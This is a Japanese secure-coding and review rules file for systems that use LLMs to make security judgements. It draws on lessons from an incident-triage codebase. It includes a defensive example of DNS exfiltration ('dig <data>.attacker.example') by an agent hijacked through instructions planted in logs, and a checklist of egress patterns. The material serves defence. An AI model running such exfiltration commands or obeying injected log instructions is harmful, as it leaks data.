# セキュリティの判定・LLM を部品に使うシステム（言語横断）

**常に注入する**（`testing.md`・`maintainability.md` と同じ）。当てはまる部品（攻撃・認可・検知の判定、LLM の出力を使う処理、エージェントに渡すツールの許可、外部設定に頼る守り）が無いグループでは、レビューで該当なしとしてよい。

2026-11 に photo-incident-triage（セキュリティインシデントの一次判定。AI の dev-flow で約 90 グループ）のソース 4.4 万行を全文レビューした。重大な不具合 5 件はどれも、レビュー約 290 件とテスト 1.8 万件をすり抜けていた。ここにある規約はそのうちの型を拾ったもの。

## 書き方（implementer 向け）

### 判定できない入力を黙って捨てない
- 攻撃の成否・認可・検知・フィルタなど**安全を判定する処理**で、判定できない入力（必要な項目が無い・形が違う・対応表に無い）を `continue` / filter / `except: pass` で捨てない。捨てた件数を数え、結果に「未判定」として出す
- 一部の入力が判定できないとき、残りの入力だけで「問題なし」と結論しない。全体の結論は**安全側**（要確認・疑いあり）に倒す
- 実例: 操作者を特定できない（未ログインの）リクエストを捨てたため、ログイン済みの正常なリクエストだけを見て「越境アクセスは不成立」と判定していた。未認証のデータ取得という、いちばん警戒すべき型が結果から消えていた

### 判定の一部が失敗したら「問題なし」にしない
- 判定の単位の一部が失敗した（DB に接続できない・権限エラー・タイムアウト・外部 API の失敗）まま、ほかの単位の結果で全体を「問題なし」にしない。失敗の理由ごとに場合分けせず、**未判定の単位が 1 つでも残れば**全体を安全側に倒す
- 実例: タイムアウトだけを安全側に倒す規則にしていたため、DB に接続できずに全単位が失敗した観点があっても、ほかの観点の「不成立」で全体が「不成立」になり、通知も出なかった

### LLM の出力は外部入力として扱う
- LLM の出力（判定・JSON・文章）は、**スキーマ・型・値の範囲を検証してから**使う。数値に文字列が来る・列挙に無い値が来る・JSON が配列で来る、を想定する
- 検証に失敗したら安全側（要確認・人間に回す）に倒す。例外で処理全体を落とさない（落ちると通知が出ない）
- 出力先（Slack・HTML・SQL・シェル・ファイルパス）に出す前に、その出力先のエスケープと長さの上限を通す。LLM はプロンプトインジェクションで攻撃者の文字列を出力しうる
- LLM の入力に入れる外部データ（ログ・UA・URL・ユーザー入力）は、区切りを付け、長さを制限して入れる。攻撃者が長い値を送ってプロンプトを上限まで膨らませると、LLM の呼び出しが失敗して判定や通知が止まる

### エージェントに渡すツールは「外へ送れるか」で選ぶ
- エージェント（Claude Code の `allowedTools`・LLM のツール呼び出し）に許可するコマンドやツールは、1 つずつ ① 任意の宛先に送れるか（ネットワーク）② 任意のファイルを読めるか ③ 任意のコードを実行できるか を評価する
- 引数を自由に取るネットワーク系（`curl`・`wget`・`dig`・`nslookup`・`nc`・`whois`・`git`）は、引数を検証するラッパー（宛先・形式を固定し、オプションを拒否する）だけを許可する。ファイルを読めるもの（`cat`・`head`・`grep`・`jq -f`・`date -f`）は、読める範囲を設定とテストで確かめる
- 許可の一覧はテストで固定し、足すときは評価の理由をコメントに書く
- 実例: `whois` はラッパーで塞いでいたのに `Bash(dig *)` を素通しで許可していた。ログに仕込まれた指示でエージェントが操られると、`dig <データ>.attacker.example` で DNS 経由の持ち出しができた

### 最後の守りの設定を確かめる
- 安全を最後に保証しているのが外部の設定（DB ロールの権限・読み取り専用・IAM・ネットワークの制限）なら、その設定を**起動時か自己診断で確かめ**、違えば止まる（fail-closed）
- コードの中の検査（構文解析・許可リスト）を厚くしても、設定の誤りは見つからない。両方あるなら、設定の確認の方を先に作る（`maintainability.md` の `maint/reimplemented-semantics`）
- 実例: SQL の構文木の検査に約 800 行を使っていた一方、接続するロールが書き込めないことは誰も確かめていなかった

## レビューチェックリスト（reviewer 向け）

| ルール ID | 重大度 | 確認内容 | 確認方法 |
|---|---|---|---|
| `sec/silent-exclusion` | major | 安全を判定する処理が、判定できない入力を黙って捨てず、件数を数えて結果に「未判定」として出している。一部が判定できないとき、全体を安全側に倒している | 判定処理の `continue`・filter・`except: pass`・早期 return を列挙し、捨てた入力が結果・件数・ログのどこに出るかを読む。結果に出なければ major。テストに「判定できる入力とできない入力が混ざった」ケースがあるかも見る |
| `sec/partial-failure-verdict` | major | 判定の単位の一部が失敗した（接続・権限・タイムアウト・外部 API）まま、全体を「問題なし」にしていない | 全体の結論を決める関数を読み、失敗した単位があるときの分岐を確かめる。失敗の理由で場合分けしていれば、漏れている理由を挙げる。単位の 1 つを失敗させ、残りを「問題なし」にしたテストがあるか |
| `sec/llm-output-untrusted` | major | LLM の出力をスキーマ・型・値の範囲で検証してから使い、失敗したら安全側に倒している。出力先に出す前にエスケープと長さの上限を通している。LLM の入力の外部データに長さの上限がある | LLM を呼ぶ箇所から出力が使われる先までを追い、`float(...)`・`[...]`・`.get(...)` が検証の前に来ていないか、Slack・HTML などに素通しになっていないかを読む。型の違う出力（文字列・null・配列）を返すテストがあるか |
| `sec/agent-tool-egress` | blocker | エージェントに許可するコマンド・ツールに、任意の宛先へ送れるもの・任意のファイルを読めるものが素通しで入っていない | 許可の一覧（`allowedTools`・ツール定義）を列挙し、コマンドごとに外へ送る書き方（`dig @host`・`dig x.attacker.example`・`curl`・`git clone <url>`）や `/proc`・秘密のファイルを読む書き方を実際に試すか、ドキュメントで確かめる。ラッパーなら引数の検証を読む |
| `sec/real-guarantee-checked` | major | 安全を最後に保証している外部の設定（DB ロールの権限・読み取り専用・IAM）を、起動時か自己診断で確かめ、違えば止まる | 守りの最後の層が何かを特定し、その性質を確かめるコード（ロールの属性・`transaction_read_only`・権限の照会）があるかを探す。無ければ major |

## 標準コマンド（tech_stack が空のときのフォールバック）

どれも任意（言語ファイルの lint・test を使う）。

| 用途 | コマンド |
|---|---|
| 捨てている入力の洗い出し（Python） | `grep -nE '^\s*(continue|pass)\b|except[^:]*:\s*(pass)?$' <判定処理のファイル>` |
| Claude Code の許可の一覧 | `grep -rn 'allowedTools\|"Bash(' <src> .claude/` |
| PostgreSQL のロールの性質 | `SELECT rolsuper, rolcreaterole, rolbypassrls FROM pg_roles WHERE rolname = current_user; SHOW transaction_read_only;` |
